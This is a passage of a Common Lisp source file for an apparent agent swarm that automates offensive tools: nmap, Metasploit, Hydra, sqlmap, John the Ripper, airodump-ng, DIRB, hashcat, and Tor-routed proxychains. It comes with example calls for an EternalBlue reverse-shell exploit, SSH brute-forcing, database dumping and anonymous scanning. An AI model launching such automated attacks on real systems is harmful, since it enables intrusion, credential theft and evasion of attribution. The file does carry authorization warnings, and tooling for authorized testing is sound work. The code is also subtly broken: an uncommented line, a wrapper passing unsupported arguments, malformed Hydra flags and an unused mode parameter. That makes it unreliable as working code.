                            :session-id session-id
                            :severity :critical)))
           ;; Exploit succeeded: "Exploit completed"
           ((cl-ppcre:scan "Exploit completed" line)
            (make-finding :exploit-succeeded :detail line))
           ;; Module loaded: "Loaded exploit module"
           ((cl-ppcre:scan "Loaded\\s+(.+)\\s+module" line)
            (cl-ppcre:register-groups-bind (module-type)
                ("Loaded\\s+(.+)\\s+module" line)
              (make-finding :module-loaded :module-type module-type)))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; Default: no parser for unrecognized tools
        ;; ─────────────────────────────────────────────────────────────────
        (t
         ;; For unknown tools, we still check for generic threat indicators
         (cond
           ;; Generic error indicator
           ((cl-ppcre:scan "(?i)(error|failed|fatal|denied)" line)
            (make-finding :generic-error :detail line :severity :warning))
           ;; Generic success indicator
           ((cl-ppcre:scan "(?i)(success|completed|done|found)" line)
            (make-finding :generic-success :detail line))
           (t nil)))))))

(defmethod stop-tool ((agent kali-agent))
  "Gracefully terminate the tool process.

Sends a SIGTERM (via UIOP:TERMINATE-PROCESS) to the running process,
then waits up to 5 seconds for it to exit. If the process is still
alive after that, falls back to KILL-TOOL for a force kill.

This method performs the following:
  1. Set agent status to :PAUSED (the process is stopping but may restart).
  2. Send SIGTERM to the process group.
  3. Poll for process exit (up to 5 seconds, 100ms intervals).
  4. If still alive, delegate to KILL-TOOL.
  5. Close and nil the output stream.
  6. Publish a stop event to gossip.
  7. Record a telemetry event.

Parameters:
  AGENT — The KALI-AGENT whose process to terminate.

Returns: T if the process was terminated (gracefully or by fallback),
         NIL if there was no process to stop.

Thread-safety: Acquires both process-lock and agent-lock in the
  defined order (process-lock first). Safe from any thread."
  (bt:with-lock-held ((agent-process-lock agent))
    (bt:with-lock-held ((agent-lock agent))
      (let ((process (agent-process agent)))
        (unless process
          (return-from stop-tool nil))
        ;; 1. Signal intent
        (setf (agent-status agent) :paused)
        ;; 2. Send SIGTERM
        (handler-case
            (uiop:terminate-process process)
          (error (e)
            (warn "[KALI] SIGTERM failed for ~A: ~A" (agent-id agent) e)))
        ;; 3. Poll for graceful exit
        (let ((waited 0))
          (loop while (and (< waited 50)  ; 50 * 100ms = 5 seconds
                           (uiop:process-alive-p process))
                do (sleep 0.1)
                   (incf waited))
          ;; 4. Force kill if still alive
          (when (uiop:process-alive-p process)
            (warn "[KALI] Process ~A did not exit gracefully, force killing."
                  (agent-id agent))
            (handler-case
                (uiop:terminate-process process :urgent t)
              (error (e)
                (warn "[KALI] SIGKILL failed for ~A: ~A" (agent-id agent) e)))))
        ;; 5. Clean up stream
        (when (agent-output-stream agent)
          (ignore-errors (close (agent-output-stream agent)))
          (setf (agent-output-stream agent) nil))
        ;; 6. Clear process handle
        (setf (agent-process agent) nil)
        ;; 7. Notify
        (publish-message :swarm.kali.status
                         `(:event :tool-stopped
                           :agent-id ,(agent-id agent)
                           :method :graceful
                           :timestamp ,(local-time:now)))
        (record-telemetry-event :kali-tool-stopped
                                :agent-id (agent-id agent)
                                :method :graceful)
        t))))

(defmethod kill-tool ((agent kali-agent))
  "Force-kill the tool process immediately.

Sends SIGKILL (via UIOP:TERMINATE-PROCESS :URGENT T) to the running
process. This is the nuclear option — use STOP-TOOL for graceful
termination when possible. The process is given no chance to clean up.

After killing:
  1. Set agent status to :FAILED.
  2. Close and nil the output stream.
  3. Clear the process handle.
  4. Publish a kill event to gossip.
  5. Record a telemetry event.

Parameters:
  AGENT — The KALI-AGENT whose process to kill.

Returns: T if the process was killed, NIL if there was no process.

Thread-safety: Acquires both locks. Safe from any thread."
  (bt:with-lock-held ((agent-process-lock agent))
    (bt:with-lock-held ((agent-lock agent))
      (let ((process (agent-process agent)))
        (unless process
          (return-from kill-tool nil))
        ;; SIGKILL — no cleanup, no appeal
        (handler-case
            (uiop:terminate-process process :urgent t)
          (error (e)
            (warn "[KALI] SIGKILL failed for ~A: ~A" (agent-id agent) e)))
        ;; Clean up
        (when (agent-output-stream agent)
          (ignore-errors (close (agent-output-stream agent)))
          (setf (agent-output-stream agent) nil))
        (setf (agent-process agent) nil
              (agent-status agent) :failed)
        ;; Notify
        (publish-message :swarm.kali.status
                         `(:event :tool-killed
                           :agent-id ,(agent-id agent)
                           :method :sigkill
                           :timestamp ,(local-time:now)))
        (record-telemetry-event :kali-tool-killed
                                :agent-id (agent-id agent)
                                :method :sigkill)
        t))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 5: Pre-Built Tool Wrappers — 10+ Security Tools
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; These constructor functions create fully configured KALI-AGENT instances
;; ready for execution. Each wrapper knows the default arguments, binary
;; location, tool category, and has appropriate parsing configured.
;;
;; All wrappers follow the same pattern:
;;   1. Resolve the binary path (with fallback warning if not installed).
;;   2. Construct the argument list from user parameters + defaults.
;;   3. Create a KALI-AGENT with the correct category and initial strategy.
;;   4. Return the agent (caller must call RUN-TOOL to execute).
;;
;; The returned agent is NOT automatically registered with the orchestrator —
;; call REGISTER-AGENT or REGISTER-KALI-AGENT if you want orchestrator
;; supervision. The agent IS automatically registered when RUN-TOOL is called.

;; ───────────────────────────────────────────────────────────────────────────
;; 5.1 NMAP — Network Mapper (Reconnaissance)
;; ───────────────────────────────────────────────────────────────────────────
;;
;; Nmap is the de facto standard for network discovery and security auditing.
;; It uses raw IP packets to determine what hosts are available, what services
;; they offer, what OS they run, and what packet filters/firewalls are in use.

(defun make-nmap-agent (target &key (args '("-sV" "-O" "--open"))
                                     (ports nil)
                                     (timing "T4")
                                     (output-xml nil))
  "Create an Nmap reconnaissance agent.

Nmap (Network Mapper) is a free and open-source utility for network
discovery and security auditing. It is the foundational reconnaissance
tool in any penetration tester's arsenal.

Parameters:
  TARGET     — The target to scan: a single IP (\"192.168.1.1\"), a CIDR
               range (\"192.168.1.0/24\"), a hostname, or a file of targets.
  ARGS       — Default nmap arguments as a list of strings. The default
               (-sV -O --open) enables version detection, OS fingerprinting,
               and only shows open ports. Override for different scan types.
  PORTS      — Optional port specification (e.g., \"1-1000\" or \"80,443,8080\").
               If provided, added as -p <ports> to the argument list.
  TIMING     — Nmap timing template: T0 (paranoid) through T5 (insane).
               Default is T4 (aggressive) for a good speed/stealth balance.
  OUTPUT-XML — If non-NIL, append -oX <filename> for XML output parsing.

Returns: A configured KALI-AGENT instance.

Example:
  ;; Quick scan of a single host
  (make-nmap-agent \"192.168.1.1\")

  ;; Full port scan with custom timing
  (make-nmap-agent \"10.0.0.0/24\"
                   :ports \"1-65535\"
                   :timing \"T3\"
                   :args '(\"-sS\" \"-sV\" \"-O\" \"-A\"))

  ;; Stealth scan (SYN only, no full TCP handshake)
  (make-nmap-agent \"target.example.com\"
                   :args '(\"-sS\" \"-Pn\" \"-f\")
                   :timing \"T2\")

Thread-safety: This function creates a new agent instance and does not
mutate global state. Safe from any thread.

References:
  • https://nmap.org/book/man.html — Official Nmap reference guide
  • nmap -h — Quick help with all available options"
  (let* ((binary (or (find-kali-binary "nmap")
                     (warn "[KALI] nmap not found in PATH. Install with: apt install nmap")))
         (all-args (append args
                           (list (concatenate 'string "-" timing))
                           (when ports (list "-p" ports))
                           (when output-xml (list "-oX" output-xml))
                           (list target))))
    (make-instance 'kali-agent
                   :binary (or binary "nmap")
                   :args all-args
                   :tool-category :recon
                   :target target
                   :capabilities '(:network-scan :service-detection :os-fingerprint)
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.2 METASPLOIT — Exploitation Framework
;; ───────────────────────────────────────────────────────────────────────────
;;
;; Metasploit is the world's most used penetration testing framework. It
;; enables security teams to verify vulnerabilities, manage security
;; assessments, and improve security awareness.

(defun make-metasploit-agent (exploit target &key (payload "generic/shell_reverse_tcp")
                                                    (lhost "127.0.0.1")
                                                    (lport 4444)
                                                    (options '()))
  "Create a Metasploit exploit agent.

Metasploit provides a true security framework for penetration testing.
This wrapper launches msfconsole in command mode (-x) to execute a
specific exploit module against a target.

Parameters:
  EXPLOIT  — The Metasploit exploit module to use, e.g.
             \"exploit/unix/ftp/vsftpd_234_backdoor\"
  TARGET   — The target host or RHOST value (IP address or hostname).
  PAYLOAD  — The payload to deliver. Default is generic/shell_reverse_tcp.
             Common alternatives: meterpreter/reverse_tcp, bind_tcp.
  LHOST    — Local host for reverse connections (your IP address).
  LPORT    — Local port to listen on for reverse shells (default 4444).
  OPTIONS  — Additional module options as alist, e.g.
             '((\"TARGET\" . \"1\") (\"SSL\" . \"true\"))

Returns: A configured KALI-AGENT instance.

Example:
  ;; Basic reverse shell exploit
  (make-metasploit-agent
    \"exploit/unix/ftp/vsftpd_234_backdoor\"
    \"192.168.1.100\"
    :lhost \"192.168.1.50\"
    :lport 4444)

  ;; With custom options
  (make-metasploit-agent
    \"exploit/windows/smb/ms17_010_eternalblue\"
    \"10.0.0.5\"
    :payload \"windows/x64/meterpreter/reverse_tcp\"
    :options '((\"SMBPIPE\" . \"browser\")))

IMPORTANT: Only use Metasploit against systems you own or have explicit
permission to test. Unauthorized access to computer systems is illegal
in most jurisdictions under laws like the CFAA (US) and CMA (UK).

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "msfconsole")
                     (warn "[KALI] msfconsole not found. Install with: apt install metasploit-framework")))
         ;; Build the msfconsole command string
         (msf-commands
          (format nil "use ~A; set RHOSTS ~A; set PAYLOAD ~A; set LHOST ~A; set LPORT ~D; ~{set ~A ~A; ~}run -z; exit"
                  exploit target payload lhost lport
                  (alexandria:flatten options)))
         (args (list "-q" "-x" msf-commands)))
    (make-instance 'kali-agent
                   :binary (or binary "msfconsole")
                   :args args
                   :tool-category :exploit
                   :target target
                   :capabilities '(:exploit :payload-delivery :session-management)
                   :timeout 600  ; Metasploit can take a while
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.3 HYDRA — Parallelized Login Cracker
;; ───────────────────────────────────────────────────────────────────────────
;;
;; Hydra is a parallelized login cracker which supports numerous protocols
;; to attack. It is very fast and flexible, and new modules are easy to add.

(defun make-hydra-agent (target service &key userlist passlist (threads 16)
                                                       (verbose t))
  "Create a Hydra brute-force agent.

Hydra supports: AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird,
FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST,
HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD,
HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP,
NNTP, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin,
Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH, SSHKEY,
Subversion, Teamspeak, Telnet, VMware-Auth, VNC, XMPP.

Parameters:
  TARGET    — The host to attack (IP or hostname).
  SERVICE   — The service protocol (e.g., \"ssh\", \"ftp\", \"http-post-form\",
              \"mysql\", \"smb\"). See Hydra's -L output for full list.
  USERLIST  — Path to a file containing usernames to try, or a list of
              usernames. Required unless using -l for a single user.
  PASSLIST  — Path to a file containing passwords to try, or a list of
              passwords. Required unless using -p for a single password.
  THREADS   — Number of parallel connections (default 16). Higher is faster
              but more detectable. Range: 1-64.
  VERBOSE   — If T (default), add -V for verbose output showing each attempt.

Returns: A configured KALI-AGENT instance.

Example:
  ;; Brute-force SSH with wordlists
  (make-hydra-agent \"192.168.1.10\" \"ssh\"
                    :userlist \"/usr/share/wordlists/usernames.txt\"
                    :passlist \"/usr/share/wordlists/rockyou.txt\"
                    :threads 8)

  ;; Brute-force HTTP form login
  (make-hydra-agent \"target.com\" \"http-post-form\"
                    :userlist '(\"admin\" \"root\" \"user\")
                    :passlist '(\"password123\" \"admin\" \"123456\")
                    :threads 4)

IMPORTANT: Only use Hydra against systems you own or have explicit
permission to test. Unauthorized brute-force attacks are illegal.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "hydra")
                     (warn "[KALI] hydra not found. Install with: apt install hydra")))
         ;; Convert list inputs to temp files
         (user-arg (cond
                     ((null userlist) (warn "[HYDRA] No userlist provided") "")
                     ((stringp userlist) (concatenate 'string "-L " userlist))
                     ((listp userlist)
                      (let ((tmp (uiop:tmpize-pathname
                                  (merge-pathnames "hydra-users.txt" (uiop:temporary-directory)))))
                        (with-open-file (f tmp :direction :output)
                          (dolist (u userlist) (format f "~A~%" u)))
                        (concatenate 'string "-L " (namestring tmp))))))
         (pass-arg (cond
                     ((null passlist) (warn "[HYDRA] No passlist provided") "")
                     ((stringp passlist) (concatenate 'string "-P " passlist))
                     ((listp passlist)
                      (let ((tmp (uiop:tmpize-pathname
                                  (merge-pathnames "hydra-passes.txt" (uiop:temporary-directory)))))
                        (with-open-file (f tmp :direction :output)
                          (dolist (p passlist) (format f "~A~%" p)))
                        (concatenate 'string "-P " (namestring tmp))))))
         (args (append
                (when verbose '("-V"))
                (list (concatenate 'string "-t" (prin1-to-string threads)))
                (unless (string= user-arg "") (list user-arg))
                (unless (string= pass-arg "") (list pass-arg))
                (list target service))))
    (make-instance 'kali-agent
                   :binary (or binary "hydra")
                   :args (alexandria:flatten args)
                   :tool-category :exploit
                   :target target
                   :capabilities '(:brute-force :credential-testing :parallel-attack)
                   :timeout 1800  ; Hydra can run for a long time
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.4 SQLMAP — Automatic SQL Injection Tool
;; ───────────────────────────────────────────────────────────────────────────
;;
;; sqlmap is an open-source penetration testing tool that automates the
;; process of detecting and exploiting SQL injection flaws and taking over
;; database servers.

(defun make-sqlmap-agent (target &key (level 1) (risk 1)
                                        (dump nil)
                                        (dbs nil)
                                        (tables nil)
                                        (batch t))
  "Create a SQLMap injection testing agent.

SQLMap supports the following database management systems: MySQL, Oracle,
PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, Sybase, Firebird,
SAP MaxDB, HSQLDB, Informix, MariaDB, MemSQL, MonetDB, Presto,
CockroachDB, TiDB, Amazon Redshift, Apache Ignite, and more.

Parameters:
  TARGET — The target URL with a SQL injection point, e.g.
           \"http://target.com/page.php?id=1\"
  LEVEL  — Test level (1-5, default 1). Higher levels test more injection
            points and boundaries. Level 1 is fast; level 5 is exhaustive.
  RISK   — Risk level (1-3, default 1). Higher risks may modify data or
            cause denial of service. Use 1 for safe reconnaissance.
  DUMP   — If T, dump database contents (destructive — requires care).
  DBS    — If T, enumerate database names.
  TABLES — If T, enumerate table names.
  BATCH  — If T (default), run in non-interactive batch mode.

Returns: A configured KALI-AGENT instance.

Example:
  ;; Safe reconnaissance scan
  (make-sqlmap-agent \"http://vulnerable.com/search.php?q=test\")

  ;; Enumerate databases (read-only)
  (make-sqlmap-agent \"http://target.com/page.php?id=1\"
                     :dbs t
                     :level 2)

  ;; Full dump (WARNING: potentially destructive)
  (make-sqlmap-agent \"http://target.com/page.php?id=1\"
                     :dump t
                     :level 3
                     :risk 2)

IMPORTANT: SQL injection testing can modify data. Always start with
level 1 and risk 1. Only increase after understanding the target and
having proper authorization.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "sqlmap")
                     (warn "[KALI] sqlmap not found. Install with: apt install sqlmap")))
         (args (append
                (list "-u" target)
                (list (format nil "--level=~D" level))
                (list (format nil "--risk=~D" risk))
                (when batch '("--batch"))
                (when dbs '("--dbs"))
                (when tables '("--tables"))
                (when dump '("--dump")))))
    (make-instance 'kali-agent
                   :binary (or binary "sqlmap")
                   :args (alexandria:flatten args)
                   :tool-category :web
                   :target target
                   :capabilities '(:sql-injection :dbms-detection :data-extraction)
                   :timeout 3600  ; SQLMap can be very slow on large databases
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.5 JOHN THE RIPPER — Password Cracker
;; ───────────────────────────────────────────────────────────────────────────
;;
;; John the Ripper is a fast password cracker, currently available for many
;; flavors of Unix, Windows, DOS, BeOS, and OpenVMS. Its primary purpose is
to detect weak Unix passwords.

(defun make-john-agent (hash-file &key (format "auto")
                                        (wordlist nil)
                                        (rules nil))
  "Create a John the Ripper password cracking agent.

John supports hundreds of hash and cipher types, including:
  • Unix crypt(3) variants: traditional DES, bigcrypt, BSDI extended DES,
    FreeBSD MD5, OpenBSD Blowfish, SHA-crypt (SHA-256 and SHA-512)
  • Windows LM and NTLM hashes
  • macOS X DMG, keychain, and salted SHA-1
  • Database servers: MySQL, MSSQL, Oracle, PostgreSQL, MongoDB
  • Network protocols: Kerberos, SIP, RADIUS, LDAP
  • And many more — run 'john --list=formats' for the full list.

Parameters:
  HASH-FILE — Path to a file containing password hashes to crack.
  FORMAT    — Hash format specifier (default \"auto\" for autodetection).
              Use a specific format like \"sha512crypt\" or \"ntlm\" for
              faster loading when the format is known.
  WORDLIST  — Optional path to a wordlist file. If not provided, John
              uses its default incremental mode (exhaustive search).
  RULES     — If T, enable word mangling rules (e.g., append numbers,
              toggle case) for more thorough attacks.

Returns: A configured KALI-AGENT instance.

Example:
  ;; Auto-detect and crack with default settings
  (make-john-agent \"/tmp/password-hashes.txt\")

  ;; Crack NTLM hashes with a wordlist
  (make-john-agent \"/tmp/ntlm-hashes.txt\"
                   :format \"ntlm\"
                   :wordlist \"/usr/share/wordlists/rockyou.txt\")

  ;; Crack SHA-512 crypt with rules enabled
  (make-john-agent \"/tmp/sha512-hashes.txt\"
                   :format \"sha512crypt\"
                   :wordlist \"/usr/share/wordlists/custom.txt\"
                   :rules t)

NOTE: John stores cracked passwords in ~/.john/john.pot. Use
'john --show <hash-file>' to display results after cracking.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "john")
                     (warn "[KALI] john not found. Install with: apt install john")))
         (args (append
                (unless (string= format "auto")
                  (list (concatenate 'string "--format=" format)))
                (when wordlist (list (concatenate 'string "--wordlist=" wordlist)))
                (when rules '("--rules"))
                (list hash-file))))
    (make-instance 'kali-agent
                   :binary (or binary "john")
                   :args (alexandria:flatten args)
                   :tool-category :crypto
                   :target hash-file
                   :capabilities '(:password-cracking :hash-analysis :dictionary-attack)
                   :timeout nil  ; Password cracking can take hours/days
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.6 AIRCRACK-NG — Wireless Security Suite
;; ───────────────────────────────────────────────────────────────────────────
;;
;; Aircrack-ng is a complete suite of tools to assess WiFi network security.
;; It focuses on different areas of WiFi security: monitoring, attacking,
;; testing, and cracking.

(defun make-aircrack-agent (interface &key (mode :monitor)
                                            (channel nil)
                                            (bssid nil)
                                            (output-file nil)
                                            (duration 300))
  "Create an Aircrack-ng wireless capture/cracking agent.

This wrapper uses airmon-ng to set monitor mode, then airodump-ng to
capture wireless traffic. The captured file can later be processed by
aircrack-ng for WEP/WPA key recovery.

Parameters:
  INTERFACE   — The wireless interface name (e.g., \"wlan0\", \"wlan1mon\").
  MODE        — Operation mode: :MONITOR (passive capture, default),
                :CRACK-WEP (active WEP injection), or :CRACK-WPA
                (WPA handshake capture + dictionary attack).
  CHANNEL     — Optional WiFi channel to lock onto (1-14 for 2.4GHz,
                36-165 for 5GHz). If NIL, scan all channels.
  BSSID       — Optional target AP MAC address (AA:BB:CC:DD:EE:FF format).
                If provided, only capture traffic from this AP.
  OUTPUT-FILE — Base filename for capture files (.cap, .csv, .kismet).
                Defaults to a temp file if not specified.
  DURATION    — Capture duration in seconds (default 300 = 5 minutes).
                Set to NIL for indefinite capture.

Returns: A configured KALI-AGENT instance.

Example:
  ;; Passive monitoring on channel 6
  (make-aircrack-agent \"wlan0\"
                       :channel 6
                       :duration 600)

  ;; Target specific AP for WPA handshake capture
  (make-aircrack-agent \"wlan0mon\"
                       :mode :crack-wpa
                       :channel 1
                       :bssid \"AA:BB:CC:DD:EE:FF\"
                       :output-file \"/tmp/wpa-capture\")

IMPORTANT: Wireless monitoring and injection may violate laws in your
jurisdiction. Only monitor networks you own or have explicit permission
to test. Many countries require all parties' consent for interception.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (case mode
                   (:monitor (find-kali-binary "airodump-ng"))
                   ((:crack-wep :crack-wpa) (find-kali-binary "airodump-ng"))
                   (otherwise (find-kali-binary "airodump-ng"))))
         (actual-binary (or binary
                            (warn "[KALI] airodump-ng not found. Install with: apt install aircrack-ng")))
         (outfile (or output-file
                      (namestring (uiop:tmpize-pathname
                                   (merge-pathnames "aircrack-capture"
                                                    (uiop:temporary-directory))))))
         (args (append
                (when channel (list "-c" (prin1-to-string channel)))
                (when bssid (list "--bssid" bssid))
                (list "-w" outfile)
                (when duration
                  ;; airodump-ng doesn't have a native duration flag;
                  ;; we'll handle duration via the timeout slot
                  nil)
                (list interface))))
    (make-instance 'kali-agent
                   :binary (or actual-binary "airodump-ng")
                   :args (alexandria:flatten args)
                   :tool-category :wireless
                   :target (or bssid interface)
                   :capabilities '(:wireless-capture :packet-injection :wep-cracking :wpa-cracking)
                   :timeout (or duration 300)
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.7 DIRB — Web Content Scanner
;; ───────────────────────────────────────────────────────────────────────────
;;
;; DIRB is a Web Content Scanner. It looks for existing (and/or hidden)
;; Web Objects by launching a dictionary-based attack against a web server
;; and analyzing the responses.

(defun make-dirb-agent (target &key (wordlist "/usr/share/dirb/wordlists/common.txt")
                                     (extensions nil)
                                     (recursive t)
                                     (threads 20))
  "Create a DIRB web directory brute-force agent.

DIRB scans web servers for directories, files, and scripts that may not
be linked from the main pages. It uses wordlists to guess paths and
analyzes HTTP response codes to determine what exists.

Parameters:
  TARGET    — The base URL to scan (e.g., \"http://target.com/\").
              Must end with a trailing slash for proper path joining.
  WORDLIST  — Path to a wordlist file (default: common.txt from DIRB's
              distribution). Larger wordlists like big.txt find more but
              take longer.
  EXTENSIONS — Optional list of file extensions to test (e.g., '(\"php\"
               \"jsp\" \"asp\" \"html\")). DIRB will append each extension
               to wordlist entries.
  RECURSIVE — If T (default), recursively scan discovered directories.
  THREADS   — Number of concurrent connections (default 20).

Returns: A configured KALI-AGENT instance.

Example:
  ;; Quick scan with defaults
  (make-dirb-agent \"http://target.com/\")

  ;; Thorough scan with extensions and custom wordlist
  (make-dirb-agent \"http://target.com/\"
                   :wordlist \"/usr/share/wordlists/dirb/big.txt\"
                   :extensions '(\"php\" \"asp\" \"jsp\")
                   :recursive t
                   :threads 50)

  ;; Fast, non-recursive scan
  (make-dirb-agent \"http://target.com/\"
                   :recursive nil
                   :threads 100)

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "dirb")
                     (warn "[KALI] dirb not found. Install with: apt install dirb")))
         (args (append
                (list target wordlist)
                (when extensions
                  (list "-X" (format nil ".~{~A~^.~}" extensions)))
                (unless recursive '("-r"))
                (list "-z" (prin1-to-string threads)))))
    (make-instance 'kali-agent
                   :binary (or binary "dirb")
                   :args (alexandria:flatten args)
                   :tool-category :web
                   :target target
                   :capabilities '(:directory-brute :web-recon :content-discovery)
                   :timeout 1800
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.8 PROXYCHAINS — Proxy Routing Wrapper
;; ───────────────────────────────────────────────────────────────────────────
;;
;; ProxyChains NG is a preloader that hooks network-related libc functions
;; to redirect connections through SOCKS4a/5 or HTTP proxies. It enables
;; anonymous operation by routing all tool traffic through Tor or other
;; proxy chains.

(defun make-proxychains-agent (target-tool target &rest tool-kwargs)
  "Create a Proxychains-wrapped agent for anonymous operation.

This wrapper takes another tool agent's specification and wraps it with
proxychains, routing all network traffic through the configured proxy
chain (typically Tor on 127.0.0.1:9050).

Parameters:
  TARGET-TOOL — A keyword naming the tool to wrap: :NMAP, :SQLMAP, :DIRB,
                :HYDRA, or any tool that makes network connections.
  TARGET      — The target for the wrapped tool (same as the inner tool's
                target parameter).
  TOOL-KWARGS — Additional keyword arguments forwarded to the inner tool's
                constructor (e.g., :PORTS, :LEVEL, :WORDLIST).

Returns: A configured KALI-AGENT that runs proxychains <tool> <args>.

Example:
  ;; Anonymous nmap scan through Tor
  (make-proxychains-agent :nmap \"target.com\"
                          :args '(\"-sT\" \"-Pn\"))

  ;; Anonymous SQLMap scan
  (make-proxychains-agent :sqlmap \"http://target.com/page.php?id=1\"
                          :level 2)

  ;; Anonymous directory brute-force
  (make-proxychains-agent :dirb \"http://target.com/\")

REQUIREMENTS:
  1. proxychains-ng must be installed: apt install proxychains-ng
  2. /etc/proxychains4.conf must be configured with proxy servers.
     For Tor: add \"socks5 127.0.0.1 9050\" to the [ProxyList] section.
  3. Tor service must be running: service tor start

NOTE: Proxychains can only proxy TCP connections. UDP-based tools and
some ICMP-based features (like nmap's OS detection) will not work
through the proxy. Use 'proxychains4 -f <config>' for custom configs.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((proxychains-binary (or (find-kali-binary "proxychains4")
                                 (find-kali-binary "proxychains")
                                 (warn "[KALI] proxychains not found. Install with: apt install proxychains-ng")))
         ;; Create the inner tool agent to extract its args
         (inner-agent (case target-tool
                        (:nmap (apply #'make-nmap-agent target tool-kwargs))
                        (:sqlmap (apply #'make-sqlmap-agent target tool-kwargs))
                        (:dirb (apply #'make-dirb-agent target tool-kwargs))
                        (:hydra (apply #'make-hydra-agent target (getf tool-kwargs :service)
                                       tool-kwargs))
                        (otherwise (error "[PROXYCHAINS] Unsupported target tool: ~A" target-tool))))
         ;; The proxychains args are: proxychains [options] <inner-binary> <inner-args>
         (proxy-args (list (namestring (agent-binary inner-agent))))
         (inner-args (agent-args inner-agent)))
    (make-instance 'kali-agent
                   :binary (or proxychains-binary "proxychains4")
                   :args (append proxy-args inner-args)
                   :tool-category :recon
                   :target target
                   :capabilities (cons :anonymous-routing (agent-capabilities inner-agent))
                   :timeout (agent-timeout inner-agent)
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.9 HASHCAT — World's Fastest Password Recovery
;; ─────────────────═════════════════════════════════════════════════════════
;;
;; Hashcat is the world's fastest and most advanced password recovery utility,
;; supporting five unique modes of attack for over 300 highly-optimized
;; hashing algorithms.

(defun make-hashcat-agent (hash-file &key (mode 0)
                                           (attack-type :dictionary)
                                           (wordlist nil)
                                           (rules nil)
                                           (mask nil)
                                           (gpu-temp-abort 90))
  "Create a Hashcat GPU cracking agent.

Hashcat supports these attack types:
  :DICTIONARY   (0) — Straight wordlist attack (needs wordlist).
  :COMBINATION  (1) — Combines words from two wordlists.
  :MASK         (3) — Brute-force with a charset mask (e.g., ?l?l?l?d?d?d).
  :HYBRID-WORD  (6) — Wordlist + mask combination.
  :HYBRID-MASK  (7) — Mask + wordlist combination.

Parameters:
  HASH-FILE    — Path to a file containing hashes to crack.
  MODE         — Hash type number (default 0 = MD5). Run 'hashcat --help'
                 for the full list (mode 100 = SHA1, 1400 = SHA-256,
                 1800 = sha512crypt, 1000 = NTLM, 5500 = NetNTLMv1, etc.).
  ATTACK-TYPE  — One of :DICTIONARY, :COMBINATION, :MASK, :HYBRID-WORD,
                 :HYBRID-MASK (default :DICTIONARY).
  WORDLIST     — Path to wordlist file (required for dictionary attacks).
  RULES        — Optional rules file for word mangling (e.g., 
                 /usr/share/hashcat/rules/best64.rule).
  MASK         — Brute-force mask (required for :MASK attack type).
                 Use Hashcat's charset notation: ?l (a-z), ?u (A-Z),
                 ?d (0-9), ?s (special), ?a (all).
  GPU-TEMP-ABORT — Abort if GPU reaches this temperature in °C (default 90).

Returns: A configured KALI-AGENT instance.

Example:
  ;; Crack MD5 hashes with a wordlist
  (make-hashcat-agent \"/tmp/md5-hashes.txt\"
                      :mode 0
                      :wordlist \"/usr/share/wordlists/rockyou.txt\")

  ;; Crack NTLM with rules
  (make-hashcat-agent \"/tmp/ntlm-hashes.txt\"
                      :mode 1000
                      :wordlist \"/usr/share/wordlists/rockyou.txt\"
                      :rules \"/usr/share/hashcat/rules/best64.rule\")

  ;; Brute-force a 6-character lowercase mask
  (make-hashcat-agent \"/tmp/md5-target.txt\"
                      :mode 0
                      :attack-type :mask
                      :mask \"?l?l?l?l?l?l\")

NOTE: Hashcat requires a GPU with OpenCL or CUDA support. For CPU-only
operation, use hashcat-legacy or john instead. Hashcat stores results in
~/.hashcat/hashcat.potfile.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "hashcat")
                     (warn "[KALI] hashcat not found. Install with: apt install hashcat")))
         (attack-code (case attack-type
                        (:dictionary 0)
                        (:combination 1)
                        (:mask 3)
                        (:hybrid-word 6)
                        (:hybrid-mask 7)
                        (otherwise 0)))
         (args (append
                (list "-m" (prin1-to-string mode))
                (list "-a" (prin1-to-string attack-code))
                (list (concatenate 'string "--gpu-temp-abort="
                                   (prin1-to-string gpu-temp-abort)))
                (when rules (list "-r" rules))
                (list hash-file)
                (cond
                  ((and wordlist (eq attack-type :dictionary))
                   (list wordlist))
                  ((and mask (eq attack-type :mask))
                   (list mask))
                  (wordlist (list wordlist))
                  (t nil)))))
    (make-instance 'kali-agent
                   :binary (or binary "hashcat")
                   :args (alexandria:flatten args)
                   :tool-category :crypto
                   :target hash-file
                   :capabilities '(:gpu-cracking :mask-attack :rule-based-attack)
                   :timeout nil  ; GPU cracking can run for hours
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.10 TSHARK — Network Protocol Analyzer
;; ───────────────────────────────────────────────────────────────────────────
;;
;; TShark is a network protocol analyzer. It lets you capture packet data
;; from a live network or read packets from a previously saved capture file,
